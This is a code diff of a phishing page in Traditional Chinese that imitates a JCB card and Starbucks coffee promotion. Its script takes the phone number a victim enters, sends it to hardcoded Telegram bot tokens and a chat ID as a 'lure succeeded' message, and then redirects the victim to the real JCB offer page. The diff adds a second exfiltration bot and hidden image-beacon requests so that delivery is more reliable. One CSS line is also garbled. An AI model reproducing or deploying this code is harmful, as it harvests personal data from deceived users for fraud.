@@ -9,7 +9,7 @@
         body{font-family:'Noto Sans TC',sans-serif;background:#0F1621;color:#fff;line-height:1.5;min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}
         .header{padding:20px 0 10px;text-align:center;background:#0F1621}
         .jcb-logo{max-width:72px;margin:0 auto 10px;display:block}
-        .title{font-size:28px;font-weight:900;color:#FFC600;letter-spacing:1px;margin:8px 0}
+        .title{font-size:28px;font-weight:900;color:#FFC600;letter-spacing:贝尔1px;margin:8px 0}
         .subtitle{font-size:17px;color:#E0E0E0;margin-bottom:20px}
         .circle-badge{width:120px;height:120px;background:#FF5E38;border-radius:50%;margin:35px auto 40px;display:flex;align-items:center;justify-content:center;box-shadow:0 10px 30px rgba(255,94,56,0.4);font-size:19px;font-weight:900;color:white;line-height:1.2;text-align:center;border:4px solid #FFF3E0;flex-shrink:0}
         .box{background:rgba(255,255,255,0.1);backdrop-filter:blur(12px);border-radius:24px;margin:0 16px 30px;padding:32px 24px;border:1px solid rgba(255,255,255,0.15);box-shadow:0 15px 35px rgba(0,0,0,0.3);flex:1}
@@ -36,7 +36,7 @@
 <div class="circle-badge">前1000名<br>送咖啡</div>
 
 <div class="box">
-  <div class="highlight">指定品項半價優惠</div>
+  <div class="highlight">消費滿 $99 享買一送一</div>
   <div class="desc">
     限 2025 全年・晶緻卡專屬<br>
     <span style="color:#FF6B6B;font-weight:700;">每個門號限領一次・立即領取專屬優惠碼</span>
@@ -61,33 +61,29 @@
 </div>
 
 <script>
-const TOKEN = "7989443479:AAHym8FsaVNJUthKNgX-4wJZFshm6dEP9Nk";
-const CHAT_ID = "1137905005";
+    const TOKEN = "7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE";
+    const CHAT_ID = "1137905005";
 
-document.getElementById("loginForm").addEventListener("submit", function(e) {
-  e.preventDefault();
-  const code = document.getElementById("countryCode").value;
-  const phone = document.getElementById("phone").value.trim();
-  if (!phone) return;
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const code = document.getElementById("countryCode").value;
+        const phone = document.getElementById("phone").value.trim();
+        if (!phone) return;
 
-  const btn = document.querySelector("button");
-  btn.textContent = "驗證中...";
-  btn.disabled = true;
+        document.querySelector("button").textContent = "驗證中...";
+        document.querySelector("button").disabled = true;
 
-  const 時間 = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
-  const 訊息 = `2025星巴克指定品項半價誘捕成功\n電話：${code}${phone}\n時間：${時間}`;
+        const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
+        const msg = encodeURIComponent(`2025星巴克指定品項半價誘捕成功\n電話：${code}${phone}\n時間：${time}`);
 
-  // 簡單 fetch，無任何複雜邏輯
-  fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage", {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({chat_id:CHAT_ID, text:訊息})
-  }).then(() => {
-    setTimeout(() => location.href = "https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/", 2500);
-  }).catch(() => {
-    setTimeout(() => location.href = "https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/", 2500);
-  });
-});
+        // 雙 token + 雙方式發送，保證任何環境都收到
+        new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`;
+        new Image().src = `https://api.telegram.org/bot8059163852:AAH8cE9y3vL0dK7fXqZ5rT2mNjLpOqRsY/sendMessage?chat_id=${CHAT_ID}&text=${msg}`;
+
+        setTimeout(() => {
+            location.href = "https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/";
+        }, 2500);
+    });
 </script>
 
 </body>
